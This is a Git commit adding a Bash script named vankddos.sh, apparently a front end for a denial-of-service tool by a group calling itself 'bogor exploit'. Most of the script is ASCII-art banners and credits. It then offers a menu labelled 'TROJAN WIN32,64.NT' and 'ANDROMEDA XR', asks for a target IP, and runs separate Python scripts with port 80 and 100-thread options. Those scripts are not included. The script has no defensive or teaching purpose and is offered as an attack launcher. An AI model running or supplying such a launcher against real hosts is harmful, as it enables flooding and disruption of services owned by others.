aa235209b13026749dd6e57926084a018929b2b9
greenzombies123 <52916652+greenzombies123@users.noreply.github.com>
2019-08-24 21:25:38 +0700

    Add files via upload

---
+++ vankddos.sh
@@ -0,0 +1,223 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo
+echo
+echo
+echo $green"@@@  @@@   @@@@@@   @@@  @@@  @@@  @@@"
+sleep 1
+echo $green"@@@  @@@  @@@@@@@@  @@@@ @@@  @@@  @@@"
+sleep 1
+echo $green"@@!  @@@  @@!  @@@  @@!@!@@@  @@!  !@@"
+sleep 1
+echo $green"!@!  @!@  !@!  @!@  !@!!@!@!  !@!  @!!"
+sleep 1
+echo $green"@!@  !@!  @!@!@!@!  @!@ !!@!  @!@@!@!"
+sleep 1
+echo $white"!@!  !!!  !!!@!!!!  !@!  !!!  !!@!!!"
+echo $white":!:  !!:  !!:  !!!  !!:  !!!  !!: :!!"
+sleep 1
+echo $white" ::!!:!   :!:  !:!  :!:  !:!  :!:  !:!"
+echo $white"  ::::    ::   :::   ::   ::   ::  :::"
+echo $white"   :       :   : :  ::    :    :   :::"
+echo
+echo
+echo
+echo $green" @@@@@@@@   @@@@@@   @@@  @@@   @@@@@@"
+sleep 1
+echo $green"@@@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@"
+sleep 1
+echo $green"!@@        @@!  @@@  @@!@!@@@  !@@"
+echo $green"!@!        !@!  @!@  !@!!@!@!  !@!"
+echo $green"!@! @!@!@  @!@!@!@!  @!@ !!@!  !!@@!!"
+sleep 1
+echo $white"!!! !!@!!  !!!@!!!!  !@!  !!!   !!@!!!"
+sleep 1
+echo $white":!!   !!:  !!:  !!!  !!:  !!!       !:!"
+echo $white":!:   !::  :!:  !:!  :!:  !:!      !:!"
+sleep 1
+echo $white" ::: ::::  ::   :::   ::   ::  :::: ::"
+echo $white" :: :: :    :   : :  ::    :   :: : :"
+echo
+echo
+figlet -f smshadow "VANK"
+sleep 1
+figlet -f smshadow "GANS"
+echo $indigo
+date
+echo $green"___________________________________________________"
+sleep 1
+echo $green" [+]"$white"Author by      "$green": VANK_GANS "
+sleep 1
+echo $green" [+]"$white"Team           "$green": bogor exploit"
+echo $green" [+]"$white"Thanks to      "$green": Ajeng"
+echo $green" [+]"$white"Thanks to      "$green": Mr.4ndy"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.4ldy"
+echo $green" [+]"$white"Thanks to      "$green": Mr.4h0nk"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.3rick"
+echo $green" [+]"$white"Thanks to      "$green": Mr.rizky.fadilah"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.ibhey"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.black"
+echo $green"___________________________________________________"
+echo
+echo
+echo $green"________________________________________"
+sleep 1
+echo
+echo $pwhite"                 LIST"
+sleep 1
+echo
+echo $green"________________________________________"
+echo
+sleep 1
+echo $green"[1]"$white".TROJAN WIN32,64.NT"
+echo $green"[2]"$white".ANDROMEDA XR"
+echo
+echo $green"________________________________________"
+echo $white"MASUKAN PILIHAN ANDA"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+echo $green"@@@  @@@   @@@@@@   @@@  @@@  @@@  @@@"
+sleep 1
+echo $green"@@@  @@@  @@@@@@@@  @@@@ @@@  @@@  @@@"
+echo $green"@@!  @@@  @@!  @@@  @@!@!@@@  @@!  !@@"
+echo $green"!@!  @!@  !@!  @!@  !@!!@!@!  !@!  @!!"
+sleep 1
+echo $green"@!@  !@!  @!@!@!@!  @!@ !!@!  @!@@!@!"
+sleep 1
+echo $white"!@!  !!!  !!!@!!!!  !@!  !!!  !!@!!!"
+echo $white":!:  !!:  !!:  !!!  !!:  !!!  !!: :!!"
+sleep 1
+echo $white" ::!!:!   :!:  !:!  :!:  !:!  :!:  !:!"
+echo $white"  ::::    ::   :::   ::   ::   ::  :::"
+echo $white"   :       :   : :  ::    :    :   :::"
+echo
+echo
+echo
+echo $green" @@@@@@@@   @@@@@@   @@@  @@@   @@@@@@"
+sleep 1
+echo $green"@@@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@"
+sleep 1
+echo $green"!@@        @@!  @@@  @@!@!@@@  !@@"
+echo $green"!@!        !@!  @!@  !@!!@!@!  !@!"
+echo $green"!@! @!@!@  @!@!@!@!  @!@ !!@!  !!@@!!"
+sleep 1
+echo $white"!!! !!@!!  !!!@!!!!  !@!  !!!   !!@!!!"
+sleep 1
+echo $white":!!   !!:  !!:  !!!  !!:  !!!       !:!"
+echo $white":!:   !::  :!:  !:!  :!:  !:!      !:!"
+sleep 1
+echo $white" ::: ::::  ::   :::   ::   ::  :::: ::"
+echo $white" :: :: :    :   : :  ::    :   :: : :"
+echo
+echo
+figlet -f smshadow "VANK"
+sleep 1
+figlet -f smshadow "GANS"
+echo $indigo
+date
+echo $green"___________________________________________________"
+sleep 1
+echo $green" [+]"$white"Author by      "$green": VANK_GANS "
+sleep 1
+echo $green" [+]"$white"Team           "$green": bogor exploit"
+echo $green" [+]"$white"Thanks to      "$green": Ajeng"
+echo $green" [+]"$white"Thanks to      "$green": Mr.4ndy"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.4ldy"
+echo $green" [+]"$white"Thanks to      "$green": Mr.4h0nk"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.3rick"
+echo $green" [+]"$white"Thanks to      "$green": Mr.rizky.fadilah"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.ibhey"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.black"
+echo $green"___________________________________________________"
+echo
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+clear
+echo $green"@@@  @@@   @@@@@@   @@@  @@@  @@@  @@@"
+sleep 1
+echo $green"@@@  @@@  @@@@@@@@  @@@@ @@@  @@@  @@@"
+echo $green"@@!  @@@  @@!  @@@  @@!@!@@@  @@!  !@@"
+echo $green"!@!  @!@  !@!  @!@  !@!!@!@!  !@!  @!!"
+sleep 1
+echo $green"@!@  !@!  @!@!@!@!  @!@ !!@!  @!@@!@!"
+sleep 1
+echo $white"!@!  !!!  !!!@!!!!  !@!  !!!  !!@!!!"
+echo $white":!:  !!:  !!:  !!!  !!:  !!!  !!: :!!"
+sleep 1
+echo $white" ::!!:!   :!:  !:!  :!:  !:!  :!:  !:!"
+echo $white"  ::::    ::   :::   ::   ::   ::  :::"
+echo $white"   :       :   : :  ::    :    :   :::"
+echo
+echo
+echo
+echo $green" @@@@@@@@   @@@@@@   @@@  @@@   @@@@@@"
+sleep 1
+echo $green"@@@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@"
+sleep 1
+echo $green"!@@        @@!  @@@  @@!@!@@@  !@@"
+echo $green"!@!        !@!  @!@  !@!!@!@!  !@!"
+echo $green"!@! @!@!@  @!@!@!@!  @!@ !!@!  !!@@!!"
+sleep 1
+echo $white"!!! !!@!!  !!!@!!!!  !@!  !!!   !!@!!!"
+sleep 1
+echo $white":!!   !!:  !!:  !!!  !!:  !!!       !:!"
+echo $white":!:   !::  :!:  !:!  :!:  !:!      !:!"
+sleep 1
+echo $white" ::: ::::  ::   :::   ::   ::  :::: ::"
+echo $white" :: :: :    :   : :  ::    :   :: : :"
+echo
+echo
+figlet -f smshadow "VANK"
+sleep 1
+figlet -f smshadow "GANS"
+echo $indigo
+date
+echo $green"___________________________________________________"
+sleep 1
+echo $green" [+]"$white"Author by      "$green": VANK_GANS "
+sleep 1
+echo $green" [+]"$white"Team           "$green": bogor exploit"
+echo $green" [+]"$white"Thanks to      "$green": Ajeng"
+echo $green" [+]"$white"Thanks to      "$green": Mr.4ndy"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.4ldy"
+echo $green" [+]"$white"Thanks to      "$green": Mr.4h0nk"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.3rick"
+echo $green" [+]"$white"Thanks to      "$green": Mr.rizky.fadilah"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.ibhey"
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": Mr.black"
+echo $green"___________________________________________________"
+echo
+echo $purple"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
